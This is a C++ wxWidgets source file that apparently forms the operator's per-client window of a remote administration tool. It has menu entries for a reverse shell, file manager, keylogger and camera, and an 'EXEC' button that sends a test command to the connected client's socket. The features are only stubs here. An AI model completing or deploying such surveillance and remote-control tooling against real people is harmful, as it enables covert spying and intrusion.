#include "frame_client.hpp"
#include "server.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

FrameCliente::FrameCliente(std::string strID)
    : wxFrame(nullptr, wxID_ANY, ":v")
{

    std::unique_lock<std::mutex> lock(vector_mutex);
    for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
        if (iter->_id == strID) {
            iter->_isBusy = true;
            break;
        }
        ++iter;
    }
    lock.unlock();

    this->strClienteID = strID;
    wxString strTitle = "[";
    strTitle.append(strID.c_str());
    strTitle.append("] - Admin");
    this->SetTitle(strTitle);
    
    wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(200, 450));
    pnl_Left->SetBackgroundColour(wxColor(255, 0, 0));

    wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(600, 450));
    pnl_Right->SetBackgroundColour(wxColor(0, 255, 0));
    
    MyTreeCtrl* m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,
        wxDefaultPosition, wxSize(200, 450));

    wxTreeItemId rootC = m_tree->AddRoot(wxT("CLI"));
    
    wxTreeItemId rootAdmin = m_tree->AppendItem(rootC, wxT("[ADMIN]"));
    wxTreeItemId rootSurveilance = m_tree->AppendItem(rootC, wxT("[VIGILANCIA]"));

    m_tree->AppendItem(rootAdmin, wxT("Reverse Shell"));
    m_tree->AppendItem(rootAdmin, wxT("File Manager"));

    m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
    m_tree->AppendItem(rootSurveilance, wxT("Camara"));
    
    

    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);

    sizer->Add(pnl_Left, 0, wxALL, 2);
    sizer->Add(pnl_Right, 1, wxALL, 1);

    this->SetSizerAndFit(sizer);
    //this->SetWindowStyle(wxSUNKEN_BORDER);

    SetClientSize(800, 600);
    
    this->btn_Test = new wxButton(pnl_Right, EnumIDS::ID_FrameClienteTest, "EXEC");



}

void FrameCliente::OnTest(wxCommandEvent& event) {
    std::vector<struct Cliente> vc_Copy;
    std::unique_lock<std::mutex> lock(vector_mutex);
    vc_Copy = p_Servidor->vc_Clientes;
    lock.unlock();

    for (auto aClient : vc_Copy) {
        if (aClient._id == this->strClienteID) {
            int ib = p_Servidor->cSend(aClient._sckCliente, "CUSTOM_TEST~0", 13, 0, false);
            std::cout << "SENT " << ib << "\n";
            break;
        }
    }
}

void FrameCliente::OnClose(wxCloseEvent& event) {
    std::lock_guard<std::mutex> lock(vector_mutex);
    for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
        if (iter->_id == this->strClienteID) {
            iter->_isBusy = false;
            iter->_ttUltimaVez = time(0);
            break;
        }
        ++iter;
    }

    event.Skip();
}

void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
    wxTreeItemId itemID = event.GetItem();
    std::cout<<GetItemText(itemID).ToStdString()<<"\n";
    
}